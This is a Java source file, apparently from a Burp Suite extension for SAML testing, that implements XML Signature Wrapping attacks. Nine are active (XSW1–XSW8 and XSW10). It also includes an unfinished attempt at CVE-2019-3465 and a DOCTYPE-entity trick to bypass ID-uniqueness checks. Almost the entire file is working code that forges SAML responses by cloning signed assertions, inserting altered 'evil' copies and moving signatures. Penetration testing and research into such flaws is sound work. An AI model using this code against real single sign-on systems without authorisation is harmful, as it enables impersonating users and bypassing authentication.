package helpers;

import burp.BurpExtender;
import helpers.DiffMatchPatch.Diff;
import helpers.DiffMatchPatch.LinesToCharsResult;
import model.BurpCertificate;
import model.BurpCertificateBuilder;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import javax.xml.crypto.MarshalException;
import javax.xml.crypto.dsig.XMLSignatureException;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.security.SignatureException;
import java.security.cert.CertificateException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;

public class XSWHelpers {

    // XSW9 was removed b/c it does not work. Code is still there if you want to have a look :)
    public final static String[] xswTypes = {"XSW1", "XSW2", "XSW3", "XSW4", "XSW5", "XSW6", "XSW7", "XSW8", "XSW10"};
    public static final HashMap<String, String> MATCH_AND_REPLACE_MAP = new HashMap<>();
    // DOCTYPE declaration hack to avoid usage of Java reflections
    public List<String> doctypeEntities = new ArrayList<>();

    /*
     * Following are the 8 common XML Signature Wrapping attacks implemented, which
     * were found in a paper called "On Breaking SAML: Be Whoever You Want to Be" We
     * have also documented these attacks in our product documentation for further
     * information
     *
     */

    public void applyXSW(String xswType, Document document) {
        switch (xswType) {
            case "XSW1":
                applyXSW1(document);
                break;
            case "XSW2":
                applyXSW2(document);
                break;
            case "XSW3":
                applyXSW3(document);
                break;
            case "XSW4":
                applyXSW4(document);
                break;
            case "XSW5":
                applyXSW5(document);
                break;
            case "XSW6":
                applyXSW6(document);
                break;
            case "XSW7":
                applyXSW7(document);
                break;
            case "XSW8":
                applyXSW8(document);
                break;
            case "XSW9":
                applyXSW9(document);
                break;
            case "XSW10":
                applyXSW10(document);
                break;
        }
    }

    // Fixed - clonedSignature was not found in clonedResponse
    public void applyXSW1(Document document) {
        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
        Element clonedResponse = (Element) response.cloneNode(true);
        // The Original response will be the evil one
        applyMatchAndReplaceValues(response);
        Element clonedSignature = (Element) clonedResponse.getElementsByTagNameNS("*", "Signature").item(0);
        clonedSignature.getParentNode().removeChild(clonedSignature);
        Element signature = (Element) response.getElementsByTagNameNS("*", "Signature").item(0);
        signature.appendChild(clonedResponse);
        response.setAttribute("ID", "_evil_response_ID");
    }

    // Fixed - clonedSignature was not found in clonedResponse
    public void applyXSW2(Document document) {
        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
        Element clonedResponse = (Element) response.cloneNode(true);
        // The Original response will be the evil one
        applyMatchAndReplaceValues(response);
        Element clonedSignature = (Element) clonedResponse.getElementsByTagNameNS("*", "Signature").item(0);
        clonedSignature.getParentNode().removeChild(clonedSignature);
        Element signature = (Element) response.getElementsByTagNameNS("*", "Signature").item(0);
        signature.getParentNode().insertBefore(clonedResponse, signature);
        response.setAttribute("ID", "_evil_response_ID");
    }

    public void applyXSW3(Document document) {
        Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        Element evilAssertion = (Element) assertion.cloneNode(true);
        applyMatchAndReplaceValues(evilAssertion);
        Element copiedSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
        evilAssertion.setAttribute("ID", "_evil_assertion_ID");
        evilAssertion.removeChild(copiedSignature);
        document.getDocumentElement().insertBefore(evilAssertion, assertion);
    }

    public void applyXSW4(Document document) {
        Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        Element evilAssertion = (Element) assertion.cloneNode(true);
        applyMatchAndReplaceValues(evilAssertion);
        Element copiedSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
        evilAssertion.setAttribute("ID", "_evil_assertion_ID");
        evilAssertion.removeChild(copiedSignature);
        document.getDocumentElement().appendChild(evilAssertion);
        evilAssertion.appendChild(assertion);
    }

    public void applyXSW5(Document document) {
        Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        Element assertion = (Element) evilAssertion.cloneNode(true);
        applyMatchAndReplaceValues(evilAssertion);
        Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
        assertion.removeChild(copiedSignature);
        document.getDocumentElement().appendChild(assertion);
        evilAssertion.setAttribute("ID", "_evil_assertion_ID");
    }

    public void applyXSW6(Document document) {
        Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        Element originalSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
        Element assertion = (Element) evilAssertion.cloneNode(true);
        applyMatchAndReplaceValues(evilAssertion);
        Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
        assertion.removeChild(copiedSignature);
        originalSignature.appendChild(assertion);
        evilAssertion.setAttribute("ID", "_evil_assertion_ID");
    }

    public void applyXSW7(Document document) {
        Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        Element extensions = document.createElement("Extensions");
        document.getDocumentElement().insertBefore(extensions, assertion);
        Element evilAssertion = (Element) assertion.cloneNode(true);
        applyMatchAndReplaceValues(evilAssertion);
        Element copiedSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
        evilAssertion.removeChild(copiedSignature);
        extensions.appendChild(evilAssertion);
    }

    public void applyXSW8(Document document) {
        Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        Element originalSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
        Element assertion = (Element) evilAssertion.cloneNode(true);
        applyMatchAndReplaceValues(evilAssertion);
        Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
        assertion.removeChild(copiedSignature);
        Element object = document.createElement("Object");
        originalSignature.appendChild(object);
        object.appendChild(assertion);
    }

    /*
     * CVE-2019-3465
     * XMLSecLibs <= 31.4.2, 2.1.0 & 3.0.3
     * SimpleSAMLphp <= 1.17.6
     * Duo Authentication Gateway (DAG) <= 1.5.9 (https://duo.com/labs/psa/duo-psa-2019-002)
     * Moodle auth_saml2 < 2019110701 (https://twitter.com/Catalyst_IT_AU/status/1192353402753208320)
     * Advisory: https://simplesamlphp.org/security/201911-01
     * Vuln. discovery and write up by Hackmanit:
     * https://www.hackmanit.de/en/blog-en/82-xml-signature-validation-bypass-in-simplesamlphp-and-xmlseclibs
     * Tweet by @jurajsomorovsky: https://twitter.com/jurajsomorovsky/status/1192452032835325952
     *
     * TODO: This does not yet work :/
     */
    public void applyXSW9(Document document) {

        try {
            XMLHelpers xmlHelpers = new XMLHelpers();

            // Calculate new digest by signing the document
            Document documentToSign = xmlHelpers.getXMLDocumentOfSAMLMessage(xmlHelpers.getStringOfDocument(document));
            Element evilAssertion = (Element) documentToSign.getElementsByTagNameNS("*", "Assertion").item(0);
            evilAssertion.setAttribute("ID", "_evil_assertion_ID");
            applyMatchAndReplaceValues(evilAssertion);
            Document documentNewDigest = selfSignAssertion(documentToSign);

            // Remove new SignatureValue and KeyInfo
            Element newAssertion = (Element) documentNewDigest.getElementsByTagNameNS("*", "Assertion").item(0);
            Element signatureToModify = (Element) newAssertion.getElementsByTagNameNS("*", "Signature").item(0);
            Element signatureValueToRemove = (Element) newAssertion.getElementsByTagNameNS("*", "SignatureValue").item(0);
            signatureToModify.removeChild(signatureValueToRemove);
            Element keyInfoToRemove = (Element) newAssertion.getElementsByTagNameNS("*", "KeyInfo").item(0);
            signatureToModify.removeChild(keyInfoToRemove);

            // Read original SignatureValue, KeyInfo & SignedInfo
            Element originalAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
            Element originalSignatureValue = (Element) originalAssertion.getElementsByTagNameNS("*", "SignatureValue").item(0);
            Element originalKeyInfo = (Element) originalAssertion.getElementsByTagNameNS("*", "KeyInfo").item(0);
            Element originalSignedInfo = (Element) originalAssertion.getElementsByTagNameNS("*", "SignedInfo").item(0);

            // Add original SignatureValue and KeyInfo to new document
            Element fakeSignedInfo = (Element) newAssertion.getElementsByTagNameNS("*", "SignedInfo").item(0);
            signatureToModify.insertBefore(documentNewDigest.adoptNode(originalSignedInfo.cloneNode(true)), fakeSignedInfo);
            signatureToModify.insertBefore(documentNewDigest.adoptNode(originalSignatureValue.cloneNode(true)), fakeSignedInfo);
            // signatureToModify.insertBefore(documentNewDigest.adoptNode(originalKeyInfo.cloneNode(true)), fakeSignedInfo);

            // Add wrapper element and original assertion to the end
            Element wrapper = documentNewDigest.createElement("Wrapper");
            newAssertion.getParentNode().appendChild(wrapper);
            wrapper.appendChild(documentNewDigest.adoptNode(originalAssertion.cloneNode(true)));

            // Print for testing...
            System.out.println(xmlHelpers.getStringOfDocument(documentNewDigest, 2));

        } catch (IOException | SAXException e) {
            BurpExtender.api.logging().logToError(e);
        }
    }

    public void applyXSW10(Document document) {
        // Get the Response and Assertion elements.
        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
        Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        if (response == null || assertion == null) {
            BurpExtender.api.logging().logToError("Could not find SAML Response with Signed Message & Assertion!");
            return;
        }

        // Get all Signature nodes.
        NodeList sigNodes = document.getElementsByTagNameNS("*", "Signature");
        // Copy into a list since we may remove nodes during iteration.
        List<Element> signatureList = new ArrayList<>();
        for (int i = 0; i < sigNodes.getLength(); i++) {
            signatureList.add((Element) sigNodes.item(i));
        }

        // Remove signature nodes that reference the Response element's ID.
        String responseID = response.getAttribute("ID");
        for (Element sig : signatureList) {
            // Locate the Reference element (assumes one exists per Signature).
            NodeList refList = sig.getElementsByTagNameNS("*", "Reference");
            if (refList.getLength() > 0) {
                Element ref = (Element) refList.item(0);
                String uri = ref.getAttribute("URI");
                if (uri != null && uri.startsWith("#")) {
                    uri = uri.substring(1); // remove leading '#'
                }
                if (uri != null && uri.equals(responseID)) {
                    sig.getParentNode().removeChild(sig);
                }
            }
        }

        // Find the Signature node that references the Assertion's ID.
        String assertionID = assertion.getAttribute("ID");
        Element assertionSignature = null;
        // Re-fetch remaining Signature nodes.
        NodeList remainingSigs = document.getElementsByTagNameNS("*", "Signature");
        for (int i = 0; i < remainingSigs.getLength(); i++) {
            Element sig = (Element) remainingSigs.item(i);
            NodeList refList = sig.getElementsByTagNameNS("*", "Reference");
            if (refList.getLength() > 0) {
                Element ref = (Element) refList.item(0);
                String uri = ref.getAttribute("URI");
                if (uri != null && uri.startsWith("#")) {
                    uri = uri.substring(1);
                }
                if (uri != null && uri.equals(assertionID)) {
                    assertionSignature = sig;
                    break;
                }
            }
        }

        // If the found assertion signature is not already a child of the Response, clone it and attach it.
        if (assertionSignature != null && !assertionSignature.getParentNode().isSameNode(response)) {
            // Deep clone the signature.
            Node clonedSig = assertionSignature.cloneNode(true);

            // Try to locate an Issuer node within the Response.
            NodeList issuerList = response.getElementsByTagNameNS("*", "Issuer");
            if (issuerList.getLength() > 0) {
                Node issuer = issuerList.item(0);
                // Insert the cloned signature immediately after the issuer.
                Node parent = issuer.getParentNode();
                Node nextSibling = issuer.getNextSibling();
                if (nextSibling != null) {
                    parent.insertBefore(clonedSig, nextSibling);
                } else {
                    parent.appendChild(clonedSig);
                }
            } else {
                // Fallback: simply append to the Response.
                response.appendChild(clonedSig);
            }

            // Create an Object element with the proper XMLDSig namespace and explicitly set xmlns.
            Element objectNode = document.createElementNS("http://www.w3.org/2000/09/xmldsig#", "Object");
            // force namespace to fix some errors
            objectNode.setAttribute("xmlns", "http://www.w3.org/2000/09/xmldsig#");
            clonedSig.appendChild(objectNode);
            // Append a deep clone of the Assertion node to the Object node.
            objectNode.appendChild(assertion.cloneNode(true));
        }

        // Change the Assertion's ID attribute by appending "ffff".
        String originalAssertionID = assertion.getAttribute("ID");
        assertion.setAttribute("ID", originalAssertionID + "ffff");

        // Remove any Signature element that is a direct child of the Assertion.
        NodeList assertionChildren = assertion.getChildNodes();
        for (int i = 0; i < assertionChildren.getLength(); i++) {
            Node child = assertionChildren.item(i);
            if (child.getNodeType() == Node.ELEMENT_NODE) {
                Element childElem = (Element) child;
                if ("Signature".equals(childElem.getLocalName())) {
                    assertion.removeChild(childElem);
                    break;
                }
            }
        }

//        // Set the Response's ID attribute to a new fixed value.
        response.setAttribute("ID", "&idViaEntity;");
        // Look for a Signature > Object > Assertion chain inside the Response.
        NodeList responseChildNodes = response.getChildNodes();
        for (int i = 0; i < responseChildNodes.getLength(); i++) {
            Node child = responseChildNodes.item(i);
            if (child.getNodeType() == Node.ELEMENT_NODE && "Signature".equals(child.getLocalName())) {
                // Within this Signature, search for an Object node.
                NodeList objectNodes = ((Element) child).getElementsByTagNameNS("*", "Object");
                for (int j = 0; j < objectNodes.getLength(); j++) {
                    Element objectElem = (Element) objectNodes.item(j);
                    // Within Object, search for an Assertion node.
                    NodeList assertionNodes = objectElem.getElementsByTagNameNS("*", "Assertion");
                    if (assertionNodes.getLength() > 0) {
                        Element objectAssertion = (Element) assertionNodes.item(0);
                        // Modify its ID by prefixing with "BypassIDUniqueness".
                        String objAssertionID = objectAssertion.getAttribute("ID");
                        objectAssertion.setAttribute("ID", "&BypassIDUniqueness;" + objAssertionID);

                        doctypeEntities.add(String.format("<!ENTITY %s \"%s\">\n", "idViaEntity", objAssertionID));
                        doctypeEntities.add(String.format("<!ENTITY %s \"%s\">\n", "BypassIDUniqueness", "&#x50;"));
                        break;
                    }
                }
            }
        }
    }


    public String applyDOCTYPE(String orgDocument) {
        if (doctypeEntities.isEmpty()) return orgDocument;

        StringBuilder doctypePayload = new StringBuilder("<!DOCTYPE response [\n");
        for (String entity : doctypeEntities) {
            doctypePayload.append(entity);
        }
        doctypePayload.append("]>");

        doctypeEntities.clear();

        String samlMessage = orgDocument.replace("&amp;", "&");

        int declarationEnd = samlMessage.indexOf("?>");
        if (declarationEnd != -1) {
            return samlMessage.substring(0, declarationEnd + 2) + doctypePayload + samlMessage.substring(declarationEnd + 2);
        }

        String xmlDeclaration = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
        return xmlDeclaration + doctypePayload + samlMessage;
    }


    // Used for XSW9
    private Document selfSignAssertion(Document document) {

        try {
            BurpCertificateBuilder burpCertificateBuilder = new BurpCertificateBuilder("CN=samlraider-temporary-cert.example.net");
            BurpCertificate burpCertificate = burpCertificateBuilder.generateSelfSignedCertificate();
            XMLHelpers xmlHelpers = new XMLHelpers();

            NodeList assertions = xmlHelpers.getAssertions(document);
            String signAlgorithm = xmlHelpers.getSignatureAlgorithm(assertions.item(0));
            String digestAlgorithm = xmlHelpers.getDigestAlgorithm(assertions.item(0));
            xmlHelpers.removeAllSignatures(document);

            String string = xmlHelpers.getString(document);
            Document documentToSign = xmlHelpers.getXMLDocumentOfSAMLMessage(string);
            xmlHelpers.removeEmptyTags(documentToSign);
            xmlHelpers.signAssertion(documentToSign, signAlgorithm, digestAlgorithm, burpCertificate.getCertificate(), burpCertificate.getPrivateKey());
            return documentToSign;

        } catch (InvalidKeyException | NoSuchAlgorithmException | SignatureException | NoSuchProviderException |
                 InvalidKeySpecException | IOException | CertificateException | XMLSignatureException | SAXException |
                 MarshalException e) {
            BurpExtender.api.logging().logToError(e);
        }
        return null;
    }

    public String diffLineMode(String text1, String text2) {
        DiffMatchPatch differ = new DiffMatchPatch();
        differ.diffTimeout = 5;
        LinesToCharsResult result = differ.diffLinesToChars(text1, text2);

        LinkedList<Diff> diffs = differ.diffMain(result.chars1, result.chars2, false);
        differ.diffCharsToLines(diffs, result.lineArray);
        return differ.diffPrettyHtml(diffs);
    }

    public void applyMatchAndReplaceValues(Node elem) {
        for (int i = 0; i < elem.getChildNodes().getLength(); i++) {
            Node currentNode = elem.getChildNodes().item(i);
            if (currentNode.getNodeType() == Node.ELEMENT_NODE) {
                applyMatchAndReplaceValues(currentNode);
            } else {
                if (!currentNode.getNodeValue().trim().equals("")) {
                    for (String matchString : MATCH_AND_REPLACE_MAP.keySet()) {
                        if (currentNode.getNodeValue().equals(matchString)) {
                            currentNode.setNodeValue(MATCH_AND_REPLACE_MAP.get(matchString));
                        }
                    }
                }
            }
        }
    }
}